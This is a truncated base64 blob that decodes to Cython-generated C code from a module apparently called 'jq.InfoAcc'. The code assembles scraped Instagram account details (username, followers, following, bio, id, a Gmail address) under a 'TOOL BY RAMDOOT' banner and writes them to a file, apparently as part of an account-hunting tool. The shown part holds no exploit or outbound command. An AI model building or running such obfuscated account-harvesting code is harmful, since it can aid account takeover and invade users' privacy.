uZDo7XG4gIH1cblxuICBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90b3RhbCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDI3MSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzEgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCAxLCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMjcxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RvdGFsLCBfX3B5eF90XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjcxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X2Z1bGxfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl91c2VybmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl91c2VybmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Jlc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNzIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoX19weXhfdF8yLCBfX3B5eF92X3VzZXJuYW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9mb3dzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X2Zvd2csIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfcHAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpO1xuICBfX3B5eF90XzE0ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfYmlvLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgX19weXhfdF8xNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X0lkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE1KSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzE1KTtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNikpIF9fUFlYX0VSUigwLCAyNzIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNik7XG4gIF9fcHl4X3RfMTcgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKF9fcHl4X3RfMTYsIF9fcHl4X3ZfSWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTcpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTcpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICBfX3B5eF90XzE2ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTYpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTYpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwO1xuICBfX3B5eF90XzE3ID0gX19QeXhfUHlVbmljb2RlX0Zyb21CSW50X2JpbnQoX19weXhfdl9tZXRhKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTtcbiAgX19weXhfdF8xOCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X2JpenosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTgpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTgpO1xuICBfX3B5eF90XzE5ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTkpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpO1xuICBfX3B5eF90XzIwWzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9UT09MX0JZX1JBTURPT1Q7XG4gIF9fcHl4X3RfMjBbMV0gPSBfX3B5eF90XzE7XG4gIF9fcHl4X3RfMjBbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMDtcbiAgX19weXhfdF8yMFszXSA9IF9fcHl4X3RfMztcbiAgX19weXhfdF8yMFs0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzExO1xuICBfX3B5eF90XzIwWzVdID0gX19weXhfdF80O1xuICBfX3B5eF90XzIwWzZdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nbWFpbF9jb207XG4gIF9fcHl4X3RfMjBbN10gPSBfX3B5eF90XzI7XG4gIF9fcHl4X3RfMjBbOF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xMjtcbiAgX19weXhfdF8yMFs5XSA9IF9fcHl4X3RfMTE7XG4gIF9fcHl4X3RfMjBbMTBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTM7XG4gIF9fcHl4X3RfMjBbMTFdID0gX19weXhfdF8xMjtcbiAgX19weXhfdF8yMFsxMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xNDtcbiAgX19weXhfdF8yMFsxM10gPSBfX3B5eF90XzEzO1xuICBfX3B5eF90XzIwWzE0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE1O1xuICBfX3B5eF90XzIwWzE1XSA9IF9fcHl4X3RfMTQ7XG4gIF9fcHl4X3RfMjBbMTZdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTY7XG4gIF9fcHl4X3RfMjBbMTddID0gX19weXhfdF8xNTtcbiAgX19weXhfdF8yMFsxOF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xNztcbiAgX19weXhfdF8yMFsxOV0gPSBfX3B5eF90XzE2O1xuICBfX3B5eF90XzIwWzIwXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE4O1xuICBfX3B5eF90XzIwWzIxXSA9IF9fcHl4X3RfMTc7XG4gIF9fcHl4X3RfMjBbMjJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTk7XG4gIF9fcHl4X3RfMjBbMjNdID0gX19weXhfdF8xODtcbiAgX19weXhfdF8yMFsyNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX3d3d19pbnN0YWdyYW1fY29tO1xuICBfX3B5eF90XzIwWzI1XSA9IF9fcHl4X3RfMTk7XG4gIF9fcHl4X3RfMjBbMjZdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9pbV9yYW1kb290O1xuICBfX3B5eF90XzIxID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8yMCwgMjcsIDUxICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xKSArIDI2ICogMyArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMykgKyAyNSAqIDMgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzQpICsgMzUgKiAyICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8yKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTEpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xMikgKyAyNCAqIDQgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEzKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTQpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xNSkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE2KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTcpICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xOCkgKyA0OSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTkpLCAxMTE0MTExIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8zKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzQpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMykgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xNSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xNikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xOCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xOSkpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMjEpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDtcbiAgX19weXhfdl9zcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMjEpO1xuICBfX3B5eF90XzIxID0gMDtcblxuICBcbiAgIHtcbiAgICBfX3B5eF90XzIxID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgMjg5LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7XG4gICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMjEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbmNvZGluZywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91dGZfOCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyODksIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fcHl4X3RfMTkgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X2J1aWx0aW5fb3BlbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdLCBfX3B5eF90XzIxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE5KSkgX19QWVhfRVJSKDAsIDI4OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7XG4gICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzE5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZXhpdCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDI4OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgX19weXhfdF8xOCA9IE5VTEw7XG4gICAgX19weXhfdF8xNyA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE3KSkgX19QWVhfRVJSKDAsIDI4OSwgX19weXhfTDE3X2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTtcbiAgICBfX3B5eF90XzUgPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTcpKSkge1xuICAgICAgX19weXhfdF8xOCA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTcpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfMTgpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzE3KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE4KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzE3LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF81ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTgsIE5VTEx9O1xuICAgICAgX19weXhfdF8yMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDEtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE3KTsgX19weXhfdF8xNyA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMjEpKSBfX1BZWF9FUlIoMCwgMjg5LCBfX3B5eF9MMTdfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7XG4gICAgfVxuICAgIF9fcHl4X3RfMTcgPSBfX3B5eF90XzIxO1xuICAgIF9fcHl4X3RfMjEgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7XG4gICAgIHtcbiAgICAgIHtcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfNywgJl9fcHl4X3RfNiwgJl9fcHl4X3RfMjIpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIyKTtcbiAgICAgICAgIHtcbiAgICAgICAgICBfX3B5eF92X2ZpbGUgPSBfX3B5eF90XzE3O1xuICAgICAgICAgIF9fcHl4X3RfMTcgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xOSA9IF9fcHl4X3ZfZmlsZTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xOSk7XG4gICAgICAgICAgX19weXhfdF8yMSA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfdl9zcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fOCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yMSkpIF9fUFlYX0VSUigwLCAyOTAsIF9fcHl4X0wyMV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMSk7XG4gICAgICAgICAgX19weXhfdF81ID0gMDtcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xOSwgX19weXhfdF8yMX07XG4gICAgICAgICAgICBfX3B5eF90XzE3ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dyaXRlLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAyOTAsIF9fcHl4X0wyMV9lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcblxuICAgICAgICAgIFxuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjIpOyBfX3B5eF90XzIyID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MMjZfdHJ5X2VuZDtcbiAgICAgICAgX19weXhfTDIxX2Vycm9yOjtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgIHtcbiAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzE3LCAmX19weXhfdF8yMSwgJl9fcHl4X3RfMTkpIDwgMCkgX19QWVhfRVJSKDAsIDI4OSwgX19weXhfTDIzX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTcpO1xuICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yMSk7XG4gICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE5KTtcbiAgICAgICAgICBfX3B5eF90XzE4ID0gUHlUdXBsZV9QYWNrKDMsIF9fcHl4X3RfMTcsIF9fcHl4X3RfMjEsIF9fcHl4X3RfMTkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTgpKSBfX1BZWF9FUlIoMCwgMjg5LCBfX3B5eF9MMjNfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICBfX3B5eF90XzIzID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzgsIF9fcHl4X3RfMTgsIE5VTEwpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE4KTsgX19weXhfdF8xOCA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIzKSkgX19QWVhfRVJSKDAsIDI4OSwgX19weXhfTDIzX2V4Y2VwdF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yMyk7XG4gICAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMjMpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIzKTsgX19weXhfdF8yMyA9IDA7XG4gICAgICAgICAgaWYgKF9fcHl4X3RfOSA8ICgwKSkgX19